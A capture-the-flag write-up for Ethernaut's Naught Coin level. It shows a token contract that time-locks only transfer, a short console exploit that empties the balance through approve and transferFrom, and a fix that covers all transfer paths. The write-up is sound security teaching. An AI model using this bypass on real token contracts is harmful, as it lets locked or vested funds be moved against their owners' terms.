# Level 15: Naught Coin

## Goal

You hold all the tokens but they are locked for 10 years via `transfer`. Move your balance to zero anyway.

## The contract

```solidity
contract NaughtCoin is ERC20 {
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    address public player;

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

## Vulnerability

Only `transfer` is overridden and time-locked. But `NaughtCoin` inherits the full ERC20 interface, including `approve` and `transferFrom`, which are **not** locked. The standard allowance flow lets tokens move without ever calling `transfer`.

## Exploit

```js
// Ethernaut console
const balance = await contract.balanceOf(player);

// approve any spender (can be yourself) for the full balance
await contract.approve(player, balance);

// move the tokens out via transferFrom (not locked)
await contract.transferFrom(player, "0x000000000000000000000000000000000000dEaD", balance);
```

Your balance is now zero, bypassing the lock entirely.

## Fix

- When restricting token movement, cover **all** transfer paths: `transfer`, `transferFrom`, and the `approve` allowance flow.
- Better, use a hook such as OpenZeppelin's `_beforeTokenTransfer`/`_update` that runs for every transfer, instead of overriding a single public method.

## Takeaway

Restricting one function of a standard interface while leaving the equivalent paths open is a common, high-impact mistake. Enforce invariants at the lowest shared layer.
